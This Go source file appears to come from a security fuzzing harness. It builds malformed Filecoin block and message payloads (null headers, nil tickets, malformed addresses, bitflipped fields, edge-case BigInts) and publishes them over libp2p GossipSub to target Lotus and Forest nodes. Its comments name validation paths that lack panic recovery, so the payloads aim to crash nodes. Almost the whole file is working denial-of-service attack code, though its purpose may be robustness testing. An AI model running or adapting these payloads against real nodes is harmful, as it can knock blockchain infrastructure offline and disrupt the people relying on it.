package main

import (
	"context"
	"fmt"
	"log"
	"time"

	pubsub "github.com/libp2p/go-libp2p-pubsub"
	"github.com/libp2p/go-libp2p/core/host"
)

// getAllGossipAttacks returns GossipSub attack vectors targeting unprotected
// panic paths in Lotus and Forest message/block validation.
//
// Removed noisy vectors (random-cbor-block, random-cbor-msg, malformed-signed-msg)
// that produce random mutations rejected at CBOR decode with near-zero signal.
func getAllGossipAttacks() []namedAttack {
	return []namedAttack{
		{name: "gossip/block-null-header", fn: func() { runGossipAttack(gossipNullHeaderBlock) }},
		{name: "gossip/block-nil-ticket", fn: func() { runGossipAttack(gossipNilTicketBlock) }},
		{name: "gossip/block-bad-address", fn: func() { runGossipAttack(gossipBadAddressBlock) }},
		{name: "gossip/msg-bad-address", fn: func() { runGossipAttack(gossipBadAddressMsg) }},
		{name: "gossip/msg-addr-roundtrip", fn: func() { runGossipAttack(gossipAddrRoundtripMsg) }},
		{name: "gossip/block-addr-roundtrip", fn: func() { runGossipAttack(gossipAddrRoundtripBlock) }},
		{name: "gossip/msg-addr-bitflip", fn: func() { runGossipAttack(gossipBitflipMsg) }},
		{name: "gossip/block-addr-bitflip", fn: func() { runGossipAttack(gossipBitflipBlock) }},
		{name: "gossip/msg-bigint-edge", fn: func() { runGossipAttack(gossipEdgeBigIntMsg) }},
	}
}

// gossipPayload describes what to publish and on which topic.
type gossipPayload struct {
	topic string // "blocks" or "msgs"
	data  []byte
}

// runGossipAttack creates a fresh host, joins the appropriate GossipSub topic,
// publishes the malformed payload, then tears down.
func runGossipAttack(buildPayload func() gossipPayload) {
	payload := buildPayload()
	topicName := fmt.Sprintf("/fil/%s/%s", payload.topic, networkName)
	publishGossipPayload(topicName, payload.data)
}

// publishGossipPayload creates a fresh host, connects to a random target,
// joins the GossipSub topic, publishes data, then tears down.
// This is the shared publish mechanism for all gossip-based attacks
// (gossip vectors, CBOR bombs, F3 attacks).
func publishGossipPayload(topicName string, data []byte) {
	target := rngChoice(targets)

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[gossip] create host failed: %v", err)
		return
	}
	defer h.Close()

	// Connect to target first so GossipSub can mesh
	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[gossip] connect to %s failed: %v", target.Name, err)
		return
	}

	if err := publishToTopic(ctx, h, topicName, data); err != nil {
		debugLog("[gossip] publish to %s failed: %v", topicName, err)
	}
}

// publishToTopic creates a GossipSub instance, joins the topic, waits for
// mesh formation, publishes data, then returns.
func publishToTopic(ctx context.Context, h host.Host, topicName string, data []byte) error {
	ps, err := pubsub.NewGossipSub(ctx, h)
	if err != nil {
		return fmt.Errorf("create gossipsub: %w", err)
	}

	topic, err := ps.Join(topicName)
	if err != nil {
		return fmt.Errorf("join topic %s: %w", topicName, err)
	}
	defer topic.Close()

	// Wait for mesh formation — peers need time to GRAFT us
	time.Sleep(2 * time.Second)

	publishCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	return topic.Publish(publishCtx, data)
}

// ---------------------------------------------------------------------------
// BlockMsg wire format (CBOR): {Header: *BlockHeader, BlsMessages: []CID, SecpkMessages: []CID}
// Lotus uses cbor-gen, so the wire format is a CBOR array(3):
//   [Header BlockHeader, BlsMessages []CID, SecpkMessages []CID]
// ---------------------------------------------------------------------------

// gossipNullHeaderBlock publishes a BlockMsg with Header=null.
// If DecodeBlockMsg succeeds, bm.Header.Cid() → nil pointer panic in
// HandleIncomingBlocks (no recover).
func gossipNullHeaderBlock() gossipPayload {
	// BlockMsg: [null, [], []]
	data := cborArray(
		cborNil(),   // Header = null
		cborArray(), // BlsMessages = []
		cborArray(), // SecpkMessages = []
	)
	return gossipPayload{topic: "blocks", data: data}
}

// gossipNilTicketBlock publishes a BlockMsg with a valid-looking Header
// but Ticket=nil. If ValidateBlockPubsub lets it through, NewTipSet sort
// dereferences Ticket → panic.
func gossipNilTicketBlock() gossipPayload {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	var opts blockHeaderOpts
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}
	opts.nilTicket = true

	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())
	return gossipPayload{topic: "blocks", data: data}
}

// gossipBadAddressBlock publishes a BlockMsg with a Miner address that
// deserializes from CBOR but panics on re-serialization in Cid() →
// ToStorageBlock() → panic(err).
func gossipBadAddressBlock() gossipPayload {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	opts := blockHeaderOpts{}
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}
	// Use a malformed address: protocol byte 0x04 (delegated) followed by
	// invalid sub-address data that CBOR decodes fine but fails Address.Bytes()
	opts.overrideMiner = []byte{0x04, 0xff, 0xff, 0xff}

	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())
	return gossipPayload{topic: "blocks", data: data}
}

// ---------------------------------------------------------------------------
// Message topic attacks — target MessageValidator.Validate() (no recover)
//
// SignedMessage wire format (CBOR array(2)): [Message, Signature]
// Message wire format (CBOR array(10)):
//   [Version, To, From, Nonce, Value, GasLimit, GasFeeCap, GasPremium, Method, Params]
// Signature: CBOR byte string (MarshalBinary format: [type_byte | data])
// ---------------------------------------------------------------------------

// gossipBadAddressMsg publishes a SignedMessage with malformed From/To
// addresses that deserialize from CBOR but panic when Message.Cid() calls
// ToStorageBlock().
func gossipBadAddressMsg() gossipPayload {
	// Build a Message with bad addresses
	// Use protocol byte 0x04 (delegated) with invalid sub-address
	badAddr := cborBytes([]byte{0x04, 0xff, 0xff, 0xff})

	msg := cborArray(
		cborUint64(0),               // Version
		badAddr,                     // To (malformed)
		badAddr,                     // From (malformed)
		cborUint64(0),               // Nonce
		cborBytes(bigIntBytes(0)),   // Value
		cborInt64(1000000),          // GasLimit
		cborBytes(bigIntBytes(100)), // GasFeeCap
		cborBytes(bigIntBytes(100)), // GasPremium
		cborUint64(0),               // Method
		cborBytes(nil),              // Params
	)

	sig := cborBytes([]byte{0x01}) // secp256k1 type, empty data

	data := cborArray(msg, sig)
	return gossipPayload{topic: "msgs", data: data}
}

// ---------------------------------------------------------------------------
// Targeted attack vectors — address round-trip and bitflip fuzzing.
//
// These target the decode/encode asymmetry in go-address:
//   - Address bytes that UnmarshalCBOR accepts but MarshalCBOR rejects
//   - Message.Cid() / BlockHeader.Cid() call panic(err) on marshal failure
//   - MessageValidator.Validate() has NO recover() → node crash
//
// Strategy: try every address protocol (0-4) with various payload shapes
// that exercise edge cases in the address round-trip logic.
// ---------------------------------------------------------------------------

// gossipAddrRoundtripMsg systematically fuzzes address bytes in a SignedMessage.
// MessageValidator.Validate has NO recover(). If the address decodes from CBOR
// but fails re-serialization, Message.Cid() panics in sigCacheKey() → crash.
func gossipAddrRoundtripMsg() gossipPayload {
	addr := generateFuzzAddress()
	addrCBOR := cborBytes(addr)

	msg := cborArray(
		cborUint64(0),               // Version
		addrCBOR,                    // To (fuzzed)
		addrCBOR,                    // From (fuzzed)
		cborUint64(0),               // Nonce
		cborBytes(bigIntBytes(0)),   // Value
		cborInt64(10000000),         // GasLimit
		cborBytes(bigIntBytes(100)), // GasFeeCap
		cborBytes(bigIntBytes(10)),  // GasPremium
		cborUint64(0),               // Method
		cborBytes(nil),              // Params
	)

	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)
	return gossipPayload{topic: "msgs", data: data}
}

// gossipAddrRoundtripBlock systematically fuzzes Miner address in a BlockMsg.
// BlockValidator.Validate HAS recover(), but if the block passes validation
// and reaches HandleIncomingBlocks, Header.Cid() panics without recover().
func gossipAddrRoundtripBlock() gossipPayload {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	opts := blockHeaderOpts{}
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}
	opts.overrideMiner = generateFuzzAddress()

	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())
	return gossipPayload{topic: "blocks", data: data}
}

// gossipBitflipMsg creates a well-formed SignedMessage, then surgically
// flips bits in the address fields. This efficiently searches for CBOR byte
// sequences that decode into valid Address structs but fail re-serialization.
func gossipBitflipMsg() gossipPayload {
	// Build a baseline valid message
	validAddr := []byte{0x00, 0xe8, 0x07} // f01000
	msg := buildMessageCBOR(validAddr)
	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)

	// Find the address bytes in the CBOR and mutate them.
	// The "To" field is the 2nd element in the Message array (index 1).
	// In our CBOR layout, the address bytes come early in the message.
	// We do targeted bitflips on address-likely bytes.
	if len(data) > 15 {
		// Target the first address region (bytes ~5-15 of the outer CBOR)
		for i := 0; i < 1+rngIntn(3); i++ {
			offset := 5 + rngIntn(minInt(12, len(data)-5))
			bit := byte(1 << uint(rngIntn(8)))
			data[offset] ^= bit
		}
	}
	return gossipPayload{topic: "msgs", data: data}
}

// gossipBitflipBlock creates a well-formed BlockMsg, then surgically
// flips bits in the Miner address field (first field of BlockHeader).
func gossipBitflipBlock() gossipPayload {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	opts := blockHeaderOpts{}
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}

	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())

	// The Miner address is the first field in the BlockHeader CBOR array,
	// which starts right after the outer array(3) header + inner array(16) header.
	// Flip 1-3 bits in the address region (first ~8 bytes of the header).
	if len(data) > 10 {
		for i := 0; i < 1+rngIntn(3); i++ {
			offset := 3 + rngIntn(minInt(8, len(data)-3))
			bit := byte(1 << uint(rngIntn(8)))
			data[offset] ^= bit
		}
	}
	return gossipPayload{topic: "blocks", data: data}
}

// gossipEdgeBigIntMsg creates a SignedMessage with edge-case BigInt values
// for Value, GasFeeCap, and GasPremium. If BigInt internal state becomes
// inconsistent after CBOR decode, Message.Cid() panics.
func gossipEdgeBigIntMsg() gossipPayload {
	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07}) // f01000

	// Pick an edge-case BigInt encoding
	var edgeVal []byte
	switch rngIntn(6) {
	case 0: // negative sign byte with no data
		edgeVal = []byte{0x01}
	case 1: // positive sign with max uint64
		edgeVal = []byte{0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	case 2: // sign byte only (0x00, no magnitude)
		edgeVal = []byte{0x00}
	case 3: // extremely large (256-bit number)
		b := make([]byte, 33)
		b[0] = 0x00 // positive
		copy(b[1:], randomBytes(32))
		edgeVal = b
	case 4: // negative large number
		b := make([]byte, 17)
		b[0] = 0x01 // negative
		copy(b[1:], randomBytes(16))
		edgeVal = b
	case 5: // empty (valid in Filecoin for zero)
		edgeVal = nil
	}

	msg := cborArray(
		cborUint64(0),       // Version
		validAddr,           // To
		validAddr,           // From
		cborUint64(0),       // Nonce
		cborBytes(edgeVal),  // Value (edge case)
		cborInt64(10000000), // GasLimit
		cborBytes(edgeVal),  // GasFeeCap (edge case)
		cborBytes(edgeVal),  // GasPremium (edge case)
		cborUint64(0),       // Method
		cborBytes(nil),      // Params
	)

	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)
	return gossipPayload{topic: "msgs", data: data}
}

// ---------------------------------------------------------------------------
// Address fuzzing helpers
// ---------------------------------------------------------------------------

// generateFuzzAddress creates address byte payloads that try to pass
// UnmarshalCBOR but fail MarshalCBOR, exploiting protocol-specific edge cases.
func generateFuzzAddress() []byte {
	protocol := rngIntn(7) // 0-4 are valid protocols, 5-6 are invalid
	switch protocol {
	case 0: // ID address — varint-encoded actor ID
		return generateFuzzIDAddress()
	case 1: // Secp256k1 — 20-byte hash payload
		return generateFuzzHashAddress(0x01)
	case 2: // Actor — 20-byte hash payload
		return generateFuzzHashAddress(0x02)
	case 3: // BLS — 48-byte public key
		return generateFuzzBLSAddress()
	case 4: // Delegated — namespace + sub-address
		return generateFuzzDelegatedAddress()
	default: // Invalid protocol byte
		b := make([]byte, 1+rngIntn(20))
		b[0] = byte(5 + rngIntn(251)) // protocol 5-255
		copy(b[1:], randomBytes(len(b)-1))
		return b
	}
}

func generateFuzzIDAddress() []byte {
	switch rngIntn(5) {
	case 0: // overflow varint: max uint64
		return []byte{0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f}
	case 1: // 10-byte varint (longer than needed)
		return []byte{0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01}
	case 2: // truncated varint (high bit set, no continuation)
		return []byte{0x00, 0x80}
	case 3: // empty payload
		return []byte{0x00}
	default: // normal-ish
		b := []byte{0x00}
		b = append(b, randomBytes(1+rngIntn(9))...)
		return b
	}
}

func generateFuzzHashAddress(protoByte byte) []byte {
	switch rngIntn(4) {
	case 0: // wrong length (not 20 bytes)
		length := rngIntn(40)
		b := make([]byte, 1+length)
		b[0] = protoByte
		copy(b[1:], randomBytes(length))
		return b
	case 1: // empty payload
		return []byte{protoByte}
	case 2: // too long (30 bytes)
		b := make([]byte, 31)
		b[0] = protoByte
		copy(b[1:], randomBytes(30))
		return b
	default: // exactly 20 bytes but random
		b := make([]byte, 21)
		b[0] = protoByte
		copy(b[1:], randomBytes(20))
		return b
	}
}

func generateFuzzBLSAddress() []byte {
	switch rngIntn(3) {
	case 0: // wrong length (not 48 bytes)
		length := rngIntn(60)
		b := make([]byte, 1+length)
		b[0] = 0x03
		copy(b[1:], randomBytes(length))
		return b
	case 1: // empty payload
		return []byte{0x03}
	default: // exactly 48 bytes but random
		b := make([]byte, 49)
		b[0] = 0x03
		copy(b[1:], randomBytes(48))
		return b
	}
}

func generateFuzzDelegatedAddress() []byte {
	switch rngIntn(6) {
	case 0: // empty sub-address
		return []byte{0x04, 0x0a} // namespace 10, empty sub
	case 1: // max namespace varint
		return []byte{0x04, 0xff, 0xff, 0xff, 0xff, 0x0f}
	case 2: // truncated namespace varint
		return []byte{0x04, 0x80}
	case 3: // very long sub-address (128 bytes)
		b := []byte{0x04, 0x0a} // namespace 10
		b = append(b, randomBytes(128)...)
		return b
	case 4: // namespace 0 (invalid — must be >0)
		return append([]byte{0x04, 0x00}, randomBytes(20)...)
	default: // EAM namespace (10) with wrong sub-address length
		b := []byte{0x04, 0x0a} // namespace 10
		b = append(b, randomBytes(rngIntn(40))...)
		return b
	}
}

// minInt returns the smaller of a and b.
func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// buildMessageCBOR builds a Filecoin Message as CBOR array(10).
// If addr is nil, uses a valid-looking f01000 address.
func buildMessageCBOR(addr []byte) []byte {
	if addr == nil {
		addr = []byte{0x00, 0xe8, 0x07} // f01000
	}
	addrCBOR := cborBytes(addr)

	return cborArray(
		cborUint64(0),               // Version
		addrCBOR,                    // To
		addrCBOR,                    // From
		cborUint64(0),               // Nonce
		cborBytes(bigIntBytes(0)),   // Value
		cborInt64(1000000),          // GasLimit
		cborBytes(bigIntBytes(100)), // GasFeeCap
		cborBytes(bigIntBytes(100)), // GasPremium
		cborUint64(0),               // Method
		cborBytes(nil),              // Params
	)
}
